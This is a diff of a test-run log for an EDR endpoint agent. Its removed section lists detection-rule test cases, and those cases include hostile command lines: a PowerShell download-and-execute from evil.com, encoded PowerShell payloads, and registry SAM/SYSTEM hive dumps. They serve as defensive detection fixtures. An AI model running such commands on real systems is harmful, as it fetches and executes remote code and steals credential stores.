@@ -1,10 +1,10 @@
-Start testing: May 18 01:19 CST
+Start testing: May 22 16:29 CST
 ----------------------------------------------------------
 1/6 Testing: edr_agent_help
 1/6 Test: edr_agent_help
 Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_agent" "--help"
 Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"edr_agent_help" start time: May 18 01:19 CST
+"edr_agent_help" start time: May 22 16:29 CST
 Output:
 ----------------------------------------------------------
 /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_agent — EDR 端点 Agent
@@ -48,18 +48,18 @@ Output:
 
 更多: README「实现状态快照」与仓库内设计文档。
 <end of output>
-Test time =   0.42 sec
+Test time =   3.38 sec
 ----------------------------------------------------------
 Test Passed.
-"edr_agent_help" end time: May 18 01:19 CST
-"edr_agent_help" time elapsed: 00:00:00
+"edr_agent_help" end time: May 22 16:29 CST
+"edr_agent_help" time elapsed: 00:00:03
 ----------------------------------------------------------
 
 2/6 Testing: edr_p0_golden
 2/6 Test: edr_p0_golden
 Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_p0_golden_test"
 Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"edr_p0_golden" start time: May 18 01:19 CST
+"edr_p0_golden" start time: May 22 16:29 CST
 Output:
 ----------------------------------------------------------
 [p0_rule_ir] loading /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/config/p0_rule_bundle_ir_v1.json (98369 bytes, JSON)
@@ -69,118 +69,77 @@ Output:
 Test time =   0.00 sec
 ----------------------------------------------------------
 Test Passed.
-"edr_p0_golden" end time: May 18 01:19 CST
+"edr_p0_golden" end time: May 22 16:29 CST
 "edr_p0_golden" time elapsed: 00:00:00
 ----------------------------------------------------------
 
-3/6 Testing: edr_dedup_golden
-3/6 Test: edr_dedup_golden
-Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_dedup_golden_test"
-Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"edr_dedup_golden" start time: May 18 01:19 CST
-Output:
-----------------------------------------------------------
-[dedup_golden] 17 PASS, 0 FAIL
-<end of output>
-Test time =   0.00 sec
-----------------------------------------------------------
-Test Passed.
-"edr_dedup_golden" end time: May 18 01:19 CST
-"edr_dedup_golden" time elapsed: 00:00:00
-----------------------------------------------------------
-
-4/6 Testing: edr_p0_perf
-4/6 Test: edr_p0_perf
-Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_p0_perf_test"
-Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"edr_p0_perf" start time: May 18 01:19 CST
-Output:
-----------------------------------------------------------
-[p0_rule_ir] loading edr_config/p0_rule_bundle_ir_v1.json (98369 bytes, JSON)
-[p0_rule_ir] loaded 150 P0 rules (process/file/net/registry) from edr_config/p0_rule_bundle_ir_v1.json
-P0 Rule Engine Test Suite
-=========================
-Build: May 18 2026 01:16:05
-Platform: Linux
-
-=== Functional Tests ===
-[PASS] Case 0: R-EXEC-001 | powershell.exe | -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A => 1 (expected 1)
-[PASS] Case 1: R-EXEC-001 | powershell.exe | -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A => 1 (expected 1)
-[FAIL] Case 2: R-EXEC-001 | powershell.exe | -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdwAuAEcAZQB0AEUAeABUAEMAbwBkAGUARgBhAHQAaABsAGUAKQAuAEIAcgBvAGQAaABuAF8A => 0 (expected 1)
-[PASS] Case 3: R-EXEC-001 | powershell.exe | -EncodedCommand => 1 (expected 1)
-[PASS] Case 4: R-EXEC-001 | pwsh.exe | -EncodedCommand SQBFAFgAIAA= => 1 (expected 1)
-[PASS] Case 5: R-EXEC-001 | cmd.exe | -EncodedCommand SQBFAFgAIAA= => 0 (expected 0)
-[PASS] Case 6: R-EXEC-001 | notepad.exe | -EncodedCommand SQBFAFgAIAA= => 0 (expected 0)
-[PASS] Case 7: R-CRED-001 | reg.exe | reg save HKLM\SAM C:\temp\sam.save /y => 1 (expected 1)
-[PASS] Case 8: R-CRED-001 | reg.exe | save HKLM\SYSTEM C:\temp\sys.save => 1 (expected 1)
-[PASS] Case 9: R-CRED-001 | reg.exe | export HKLM\SECURITY C:\temp\sec.reg => 0 (expected 0)
-[PASS] Case 10: R-CRED-001 | cmd.exe | reg save HKLM\SAM C:\temp\sam.save => 0 (expected 0)
-[PASS] Case 11: R-FILELESS-001 | powershell.exe | IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1') => 1 (expected 1)
-[PASS] Case 12: R-FILELESS-001 | powershell.exe | Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1') => 1 (expected 1)
-[PASS] Case 13: R-FILELESS-001 | powershell.exe | iex powershell -enc SQBFAFgAIAA= => 1 (expected 1)
-[PASS] Case 14: R-FILELESS-001 | powershell.exe | [Reflection.Assembly]::Load => 1 (expected 1)
-[PASS] Case 15: R-FILELESS-001 | cmd.exe | IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1') => 0 (expected 0)
-[PASS] Case 16: R-FILELESS-001 | notepad.exe | Invoke-Expression cmd => 0 (expected 0)
-
-=== Performance Tests ===
-Iterations: 100000
-Average: 0.000 ms (0.286 us)
-Min: 0.000 ms, Max: 0.042 ms
-Throughput: 3502014 ops/sec
-
-=== Stress Tests ===
-Total ops: 300000 in 0.08 seconds
-Throughput: 3760011 ops/sec
-Latency: 0.000 ms/op
-
-=== Summary ===
-PASS: 16, FAIL: 1
-Total test cases: 17
-<end of output>
-Test time =   0.11 sec
-----------------------------------------------------------
-Test Failed.
-"edr_p0_perf" end time: May 18 01:19 CST
-"edr_p0_perf" time elapsed: 00:00:00
-----------------------------------------------------------
-
-5/6 Testing: test_event_bus_mpmc_stress
-5/6 Test: test_event_bus_mpmc_stress
+3/6 Testing: test_event_bus_mpmc_stress
+3/6 Test: test_event_bus_mpmc_stress
 Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/test_event_bus_mpmc_stress" "250" "4" "64"
 Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"test_event_bus_mpmc_stress" start time: May 18 01:19 CST
+"test_event_bus_mpmc_stress" start time: May 22 16:29 CST
 Output:
 ----------------------------------------------------------
-[event_bus] A4.1 mpmc: duration=250ms nprod=4 cap=64 pops=push=980343 dropped=6552748 hwm_hits=935842
+[event_bus] A4.1 mpmc: duration=250ms nprod=4 cap=64 pops=push=804211 dropped=4966483 hwm_hits=799674
 <end of output>
-Test time =   0.61 sec
+Test time =   0.25 sec
 ----------------------------------------------------------
 Test Passed.
-"test_event_bus_mpmc_stress" end time: May 18 01:19 CST
+"test_event_bus_mpmc_stress" end time: May 22 16:29 CST
 "test_event_bus_mpmc_stress" time elapsed: 00:00:00
 ----------------------------------------------------------
 
-6/6 Testing: edr_p0_ir_record_golden
-6/6 Test: edr_p0_ir_record_golden
+4/6 Testing: edr_p0_ir_record_golden
+4/6 Test: edr_p0_ir_record_golden
 Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/edr_p0_ir_record_golden_test"
 Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
-"edr_p0_ir_record_golden" start time: May 18 01:19 CST
+"edr_p0_ir_record_golden" start time: May 22 16:29 CST
 Output:
 ----------------------------------------------------------
 [p0_rule_ir] loading /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/config/p0_rule_bundle_ir_v1.json (98369 bytes, JSON)
 [p0_rule_ir] loaded 150 P0 rules (process/file/net/registry) from /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/config/p0_rule_bundle_ir_v1.json
 [p0_ir_record] ok (file_read / file_write / network_connect / registry_set; see network_aux_path for net+path 规则)
 <end of output>
-Test time =   0.37 sec
+Test time =   0.01 sec
 ----------------------------------------------------------
 Test Passed.
-"edr_p0_ir_record_golden" end time: May 18 01:19 CST
+"edr_p0_ir_record_golden" end time: May 22 16:29 CST
 "edr_p0_ir_record_golden" time elapsed: 00:00:00
 ----------------------------------------------------------
 
-End testing: May 18 01:19 CST
+5/6 Testing: detection_profile_trigger
+5/6 Test: detection_profile_trigger
+Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/test_detection_profile_trigger"
+Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
+"detection_profile_trigger" start time: May 22 16:29 CST
+Output:
+----------------------------------------------------------
+<end of output>
+Test time =   0.01 sec
+----------------------------------------------------------
+Test Passed.
+"detection_profile_trigger" end time: May 22 16:29 CST
+"detection_profile_trigger" time elapsed: 00:00:00
+----------------------------------------------------------
 
-A4.1 =   0.61 sec*proc
+6/6 Testing: forensic_trigger
+6/6 Test: forensic_trigger
+Command: "/Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin/test_forensic_trigger"
+Directory: /Users/qiuxinliang/工程区/EDR DEV/AI Agent/edr-agent/build_darwin
+"forensic_trigger" start time: May 22 16:29 CST
+Output:
+----------------------------------------------------------
+<end of output>
+Test time =   0.01 sec
+----------------------------------------------------------
+Test Passed.
+"forensic_trigger" end time: May 22 16:29 CST
+"forensic_trigger" time elapsed: 00:00:00
+----------------------------------------------------------
 
-event_bus =   0.61 sec*proc
+End testing: May 22 16:29 CST
+
+A4.1 =   0.25 sec*proc
+
+event_bus =   0.25 sec*proc
 
